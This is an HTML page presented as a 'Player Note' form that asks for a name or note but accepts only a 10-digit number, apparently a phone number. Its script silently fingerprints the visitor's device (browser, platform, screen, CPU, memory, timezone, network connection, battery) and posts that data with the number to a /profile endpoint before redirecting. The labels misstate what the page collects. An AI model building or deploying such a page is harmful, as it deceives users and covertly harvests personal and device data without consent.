<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Player Note</title>
  <style>
    :root {
      --bg-1: #f3efe6;
      --bg-2: #d6e4f0;
      --card: rgba(255, 255, 255, 0.92);
      --text: #1f2933;
      --muted: #52606d;
      --accent: #111827;
      --accent-dark: #000000;
      --border: rgba(31, 41, 51, 0.12);
      --shadow: 0 24px 60px rgba(31, 41, 51, 0.16);
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      padding: 24px;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      color: var(--text);
      background:
        radial-gradient(circle at top left, rgba(194, 65, 12, 0.18), transparent 30%),
        radial-gradient(circle at bottom right, rgba(37, 99, 235, 0.18), transparent 32%),
        linear-gradient(135deg, var(--bg-1), var(--bg-2));
    }

    .card {
      width: min(100%, 440px);
      padding: 34px 28px;
      border: 1px solid var(--border);
      border-radius: 24px;
      background: var(--card);
      box-shadow: var(--shadow);
      backdrop-filter: blur(14px);
    }

    h1 {
      margin: 0;
      font-size: clamp(1.8rem, 5vw, 2.3rem);
      line-height: 1.15;
      text-align: center;
    }

    p {
      margin: 14px 0 0;
      text-align: center;
      color: var(--muted);
      line-height: 1.6;
    }

    label {
      display: block;
      margin-top: 22px;
      margin-bottom: 8px;
      font-weight: 700;
    }

    input {
      width: 100%;
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 14px 16px;
      font-size: 1rem;
      color: var(--text);
      background: rgba(255, 255, 255, 0.95);
    }

    .actions {
      display: flex;
      gap: 12px;
      margin-top: 24px;
      flex-wrap: wrap;
      justify-content: center;
    }

    button,
    a {
      border: 0;
      border-radius: 999px;
      padding: 14px 22px;
      font-size: 1rem;
      font-weight: 700;
      cursor: pointer;
      transition: transform 0.18s ease, opacity 0.18s ease, background 0.18s ease;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      justify-content: center;
    }

    button:hover,
    a:hover {
      transform: translateY(-1px);
    }

    button:disabled {
      cursor: wait;
      opacity: 0.7;
      transform: none;
    }

    .primary {
      background: var(--accent);
      color: #fff;
    }

    .primary:hover {
      background: var(--accent-dark);
    }

    .secondary {
      background: rgba(82, 96, 109, 0.12);
      color: var(--text);
    }

    .hint {
      min-height: 24px;
      margin-top: 14px;
      text-align: center;
      color: var(--muted);
      font-weight: 600;
    }
  </style>
</head>
<body>
  <main class="card">
    <h1>Add your name or note</h1>
    <p>This will be saved to the current logs before you continue.</p>

    <label for="playerInput">Enter 10-digit number</label>
    <input id="playerInput" name="playerInput" type="tel" inputmode="numeric" maxlength="10" placeholder="Type 10 digits">

    <div class="actions">
      <button class="primary" id="saveBtn" type="button">Save and Continue</button>
    </div>

    <div class="hint" id="statusText" aria-live="polite"></div>
  </main>

  <script>
    const playerInput = document.getElementById("playerInput");
    const saveBtn = document.getElementById("saveBtn");
    const statusText = document.getElementById("statusText");

    function setBusy(isBusy) {
      saveBtn.disabled = isBusy;
    }

    function setStatus(message) {
      statusText.textContent = message;
    }

    async function collectBatteryDetails() {
      if (!navigator.getBattery) {
        return {
          level: "-",
          charging: "-"
        };
      }

      try {
        const battery = await navigator.getBattery();
        return {
          level: `${Math.round((battery.level || 0) * 100)}%`,
          charging: battery.charging
        };
      } catch (error) {
        return {
          level: "-",
          charging: "-"
        };
      }
    }

    function collectSnapshot() {
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      return {
        userAgent: navigator.userAgent || "",
        platform: navigator.platform || "",
        language: navigator.language || "",
        languages: Array.isArray(navigator.languages) ? navigator.languages : [],
        cookieEnabled: navigator.cookieEnabled,
        onLine: navigator.onLine,
        hardwareConcurrency: navigator.hardwareConcurrency || null,
        deviceMemory: navigator.deviceMemory || null,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
        screen: {
          width: window.screen?.width ?? null,
          height: window.screen?.height ?? null,
          availWidth: window.screen?.availWidth ?? null,
          availHeight: window.screen?.availHeight ?? null,
          colorDepth: window.screen?.colorDepth ?? null,
          pixelDepth: window.screen?.pixelDepth ?? null,
          pixelRatio: window.devicePixelRatio || null,
          orientation: window.screen?.orientation?.type || ""
        },
        connection: connection ? {
          effectiveType: connection.effectiveType || "",
          downlink: connection.downlink ?? null,
          rtt: connection.rtt ?? null,
          saveData: connection.saveData ?? null,
          type: connection.type || ""
        } : null
      };
    }

    async function sendProfileInput() {
      const snapshot = collectSnapshot();
      snapshot.battery = await collectBatteryDetails();

      const response = await fetch("/profile", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          label: "Player Input",
          value: playerInput.value.trim(),
          timestamp: new Date().toISOString(),
          page: window.location.href,
          snapshot
        })
      });

      if (!response.ok) {
        throw new Error("Failed to send profile input.");
      }
    }

    saveBtn.addEventListener("click", async () => {
      const value = playerInput.value.replace(/\D/g, "").trim();
      playerInput.value = value;

      if (!value) {
        playerInput.focus();
        setStatus("Enter a 10-digit number first.");
        return;
      }

      if (value.length !== 10) {
        playerInput.focus();
        setStatus("Enter exactly 10 digits.");
        return;
      }

      setBusy(true);
      setStatus("Saving...");

      try {
        await sendProfileInput();
        setStatus("Saved. Opening...");
        window.location.href = "/continue.html";
      } catch (error) {
        setStatus("Could not save. Please try again.");
      } finally {
        setBusy(false);
      }
    });

    playerInput.addEventListener("input", () => {
      const digitsOnly = playerInput.value.replace(/\D/g, "").slice(0, 10);
      if (playerInput.value !== digitsOnly) {
        playerInput.value = digitsOnly;
      }
      if (statusText.textContent) {
        setStatus("");
      }
    });
  </script>
</body>
</html>
